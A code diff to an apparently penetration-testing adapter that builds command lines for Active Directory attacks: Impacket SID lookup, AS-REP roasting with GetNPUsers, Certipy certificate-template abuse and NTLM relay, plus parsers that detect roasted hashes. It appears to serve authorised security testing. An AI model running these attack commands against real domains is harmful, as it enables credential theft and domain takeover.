@@ -3,7 +3,7 @@
 Provides bounded Active Directory discovery and exploitation operations:
 
 **Discovery operations:** (no capability required)
-- domain_discovery        — nltest /DSGETDC
+- domain_discovery        — bounded Impacket SID lookup
 - ldap_rootdse            — ldapsearch RootDSE
 - smb_enumeration         — smbclient share listing
 - kerberos_user_validation — Kerbrute user enumeration
@@ -187,7 +187,12 @@ class ActiveDirectoryAdapter:
         domain: str,
     ) -> ProcessSpec:
         return ProcessSpec(
-            argv=("nltest", "/DSGETDC", domain or str(context.target.host)),
+            argv=(
+                "impacket-lookupsid",
+                "-no-pass",
+                str(context.target.host),
+                "500",
+            ),
             timeout_seconds=30,
             max_output_bytes=256 * 1024,
         )
@@ -224,8 +229,15 @@ class ActiveDirectoryAdapter:
     ) -> ProcessSpec:
         userlist = str(inputs.get("userlist", "/opt/tools/userlist.txt"))
         return ProcessSpec(
-            argv=("kerbrute", "userenum", "-d", domain or "contoso.local",
-                   userlist, "--dc", str(context.target.host)),
+            argv=(
+                "impacket-GetNPUsers",
+                "-no-pass",
+                "-dc-ip",
+                str(context.target.host),
+                "-usersfile",
+                userlist,
+                f"{domain or 'contoso.local'}/",
+            ),
             timeout_seconds=300,
             max_output_bytes=1 * 1024 * 1024,
         )
@@ -252,7 +264,7 @@ class ActiveDirectoryAdapter:
         domain: str,
     ) -> ProcessSpec:
         return ProcessSpec(
-            argv=("certipy", "find", "-u", str(inputs.get("username", "")),
+            argv=("certipy-ad", "find", "-u", str(inputs.get("username", "")),
                    "-p", str(inputs.get("password", "")),
                    "-dc-ip", str(context.target.host),
                    "-target", domain or "contoso.local"),
@@ -310,7 +322,11 @@ class ActiveDirectoryAdapter:
     ) -> ProcessSpec:
         target = str(inputs.get("relay_target", ""))
         return ProcessSpec(
-            argv=("ntlmrelayx.py", "-t", target or f"smb://{context.target.host}"),
+            argv=(
+                "impacket-ntlmrelayx",
+                "-t",
+                target or f"smb://{context.target.host}",
+            ),
             timeout_seconds=300,
             max_output_bytes=2 * 1024 * 1024,
         )
@@ -355,7 +371,7 @@ class ActiveDirectoryAdapter:
         ca = str(inputs.get("ca", f"{domain}\\{domain}-DC01-CA"))
         template = str(inputs.get("template", "VulnTemplate"))
         return ProcessSpec(
-            argv=("certipy", "req", "-u", str(inputs.get("username", "")),
+            argv=("certipy-ad", "req", "-u", str(inputs.get("username", "")),
                    "-p", str(inputs.get("password", "")),
                    "-ca", ca,
                    "-template", template,
@@ -386,7 +402,11 @@ class ActiveDirectoryAdapter:
         observations: list[Observation] = []
 
         # Detect domain discovery output
-        if "DSGETDC" in stdout or "Dom Name:" in stdout:
+        if (
+            "DSGETDC" in stdout
+            or "Dom Name:" in stdout
+            or "Domain SID" in stdout
+        ):
             observations.append(self._make_observation({
                 "tool": "domain_discovery",
                 "type": "domain_info",
@@ -412,8 +432,13 @@ class ActiveDirectoryAdapter:
             }))
             return tuple(observations)
 
-        # Detect Kerbrute user validation output
-        if "VALID USERNAME" in stdout or "kerbrute" in stdout.lower():
+        # Detect bounded Kerberos/AS-REP user validation output
+        if (
+            "VALID USERNAME" in stdout
+            or "kerbrute" in stdout.lower()
+            or "doesn't have UF_DONT_REQUIRE_PREAUTH set" in stdout
+            or "$krb5asrep$" in stdout
+        ):
             observations.append(self._make_observation({
                 "tool": "kerberos_user_validation",
                 "type": "user_enumeration",
